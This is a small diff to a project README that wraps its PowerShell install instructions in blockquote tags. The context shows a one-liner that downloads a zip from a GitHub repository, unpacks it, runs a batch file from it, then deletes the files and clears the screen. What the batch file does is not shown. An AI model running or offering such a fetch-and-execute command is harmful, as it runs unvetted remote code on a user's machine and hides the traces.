@@ -15,6 +15,8 @@ boiling hatred in a pest
 
 **Wihtout** dependencies
 
+<blockquote>
+
 <details>
   <summary>PowerShell</summary>
   
@@ -51,6 +53,8 @@ boiling hatred in a pest
     powershell -c "& {$w=$home;$u='https://github.com/3lv/a/archive/a.zip';$z=\"$w\a.zip\";$d=\"$w\a\\\";(New-Object System.Net.WebClient).DownloadFile($u,$z);Expand-Archive $z $d -F;cd $d\..;.\a\a-a\a.bat;Remove-Item $z,$d -R -F;cls}"
     ```
 </details>
+
+</blockquote>
 
 **With** dependencies
 
